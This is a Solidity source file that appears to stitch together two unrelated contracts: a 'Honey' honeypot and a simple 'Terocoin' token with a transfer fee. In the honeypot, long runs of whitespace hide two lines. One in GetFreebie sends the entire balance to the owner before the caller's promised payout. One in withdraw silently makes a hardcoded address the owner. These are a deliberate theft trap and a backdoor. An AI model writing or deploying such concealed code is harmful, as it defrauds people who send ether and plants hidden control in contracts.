 

pragma solidity ^0.4.19;

contract Honey
{
    address public Owner = msg.sender;
   
    function()
    public
    payable
    {
        
    }
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract TerocoinToken {
    string internal _symbol = "TERO";
    string internal _name = "Terocoin";
    uint8 internal _decimals = 18;
    uint internal _totalSupply = 24500000000000000000000000;
    mapping (address => uint256) internal _balanceOf;
    address owner;
    address _feeWallet;
    uint256 _fee = 1;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor(address feeWallet) public {
        owner = msg.sender;
        _balanceOf[msg.sender] = _totalSupply;
        _feeWallet = feeWallet;
    }

    function calculateFee(uint loanAmount, uint interestNumerator, uint interestDenominator) public pure returns (uint) {
        return (loanAmount * interestNumerator) / interestDenominator;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_value > 0, "tranfer: _value must required");
        require(_value <= _balanceOf[msg.sender], "tranfer: _value > _balanceOf");

        uint valFee = calculateFee(_value, _fee, 1000);
        _balanceOf[msg.sender] = SafeMath.sub(_balanceOf[msg.sender], _value);
        _balanceOf[_feeWallet] = SafeMath.add(_balanceOf[_feeWallet], valFee);
        _balanceOf[_to] = SafeMath.add(_balanceOf[_to], SafeMath.sub(_value, valFee));

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
}







